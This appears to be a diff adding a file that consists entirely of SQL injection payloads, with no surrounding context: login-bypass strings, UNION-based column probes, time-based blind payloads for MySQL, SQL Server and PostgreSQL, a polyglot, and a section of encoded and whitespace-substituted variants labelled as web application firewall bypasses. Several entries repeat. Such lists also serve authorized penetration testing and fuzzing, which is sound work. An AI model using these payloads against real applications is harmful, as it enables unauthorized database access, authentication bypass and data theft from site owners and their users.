@@ -1,0 +1,106 @@
+'
+"
+'--
+' #
+'/*
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+' AND 1=(SELECT COUNT(*) FROM tablename)--
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' GROUP BY 1,2,3--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 10--
+'); WAITFOR DELAY '0:0:5'--
+'); SELECT PG_SLEEP(5)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='1
+1' AND 1=1
+1' AND 1=2
+1" AND 1=1
+1" AND 1=2
+' OR TRUE--
+" OR TRUE--
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+' OR 'a'='b
+' OR 1=1 LIMIT 1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1;--
+' OR 1=1;#
+' OR 1=1;/*
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'#
+') OR ('1'='1'/*
+') OR '1'='1
+') OR '1'='1'--
+') OR '1'='1'#
+') OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+" OR "1"="1"/*
+" OR 1=1
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+" OR 1=1;--
+" OR 1=1;#
+" OR 1=1;/*
+") OR ("1"="1
+") OR ("1"="1"--
+") OR ("1"="1"#
+") OR ("1"="1"/*
+") OR "1"="1
+") OR "1"="1"--
+") OR "1"="1"#
+") OR "1"="1"/*
+# Polyglots
+SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+' OR 1=1 --
+" OR 1=1 --
+' OR '1'='1' { % / * / }
+# WAF Bypass & Encoding
+%27%20OR%201%3D1--
+0x61646d696e
+CHAR(39,79,82,39,49,39,61,39,49)
+'/**/OR/**/1=1--
+'OR%091=1--
+'OR%0a1=1--
+'OR%0b1=1--
+'OR%0c1=1--
+'OR%0d1=1--
+'OR%a01=1--
+'#
+'--
+'-- -
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' GROUP BY 1,2,3--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 10--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@VERSION,2,3--
+' UNION SELECT version(),2,3--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+{"id": "1' OR 1=1--"}
+```
